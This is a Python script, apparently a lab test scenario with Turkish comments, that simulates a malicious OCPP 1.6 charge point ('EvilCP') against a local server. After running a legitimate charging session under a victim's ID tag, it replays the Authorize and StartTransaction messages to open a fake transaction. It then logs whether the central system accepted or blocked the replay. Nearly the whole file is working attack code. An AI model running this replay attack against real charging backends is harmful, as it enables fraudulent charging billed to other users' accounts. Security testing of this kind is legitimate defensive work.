import asyncio
import logging
from datetime import datetime
from ocpp.v16 import ChargePoint as Cp
from ocpp.v16 import call
from ocpp.v16.enums import RegistrationStatus, AuthorizationStatus
import websockets

# --- MELIK REPLAY ATTACK SENARYOSU ---
SCENARIO_NAME = "melik_replay_attack"
CP_ID = "CP_MELIK"
WS_URL = f"ws://localhost:9000/{CP_ID}"
ID_TAG_VICTIM = "USER_MELIK_VALID"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

class EvilCP(Cp):
    async def send_boot_notification(self):
        req = call.BootNotificationPayload(charge_point_vendor="MelikVendor", charge_point_model="ReplaySim")
        await self.call(req)

    async def send_authorize(self, id_tag):
        logging.info(f"🔑 [Auth] Kart okutuluyor: {id_tag}")
        req = call.AuthorizePayload(id_tag=id_tag)
        res = await self.call(req)
        return res.id_tag_info['status']

    async def send_start_transaction(self, id_tag):
        logging.info("⚡ [Start] Şarj başlatma isteği...")
        req = call.StartTransactionPayload(connector_id=1, id_tag=id_tag, meter_start=0, timestamp=datetime.utcnow().isoformat())
        res = await self.call(req)
        return res.transaction_id

    async def send_stop_transaction(self, trans_id, meter_stop):
        logging.info("🛑 [Stop] Şarj durduruluyor...")
        req = call.StopTransactionPayload(meter_stop=meter_stop, timestamp=datetime.utcnow().isoformat(), transaction_id=trans_id)
        await self.call(req)

    async def send_meter_values(self, trans_id, val):
        req = call.MeterValuesPayload(connector_id=1, transaction_id=trans_id, meter_value=[{"timestamp": datetime.utcnow().isoformat(), "sampled_value": [{"value": str(val), "unit": "Wh"}]}])
        await self.call(req)

async def run_scenario():
    print(f"--- SENARYO BAŞLATILIYOR: {SCENARIO_NAME} ---")
    async with websockets.connect(WS_URL, subprotocols=['ocpp1.6']) as ws:
        cp = EvilCP(CP_ID, ws)
        await asyncio.gather(cp.start(), execute_logic(cp))

async def execute_logic(cp):
    # NORMAL İŞLEM
    await cp.send_boot_notification()
    await asyncio.sleep(2)
    
    if await cp.send_authorize(ID_TAG_VICTIM) == AuthorizationStatus.accepted:
        tid = await cp.send_start_transaction(ID_TAG_VICTIM)
        for i in range(1, 4):
            await asyncio.sleep(1)
            await cp.send_meter_values(tid, i*120)
        await cp.send_stop_transaction(tid, 400)
        logging.info("✅ Normal işlem bitti. Dinleme modu (Sniffing) aktif...\n")
    
    # SALDIRI (REPLAY)
    await asyncio.sleep(3)
    logging.info("💀 [SALDIRI] Replay Attack: Aynı paket tekrar gönderiliyor!")
    
    if await cp.send_authorize(ID_TAG_VICTIM) == AuthorizationStatus.accepted:
        logging.info("⚠️ [BAŞARILI] Sistem Replay'i yedi! Sahte işlem yapılıyor.")
        fake_tid = await cp.send_start_transaction(ID_TAG_VICTIM)
        await asyncio.sleep(2)
        await cp.send_stop_transaction(fake_tid, 50)
    else:
        logging.info("🛡️ [BAŞARISIZ] Sistem saldırıyı engelledi.")

if __name__ == "__main__":
    try: asyncio.run(run_scenario())
    except: pass
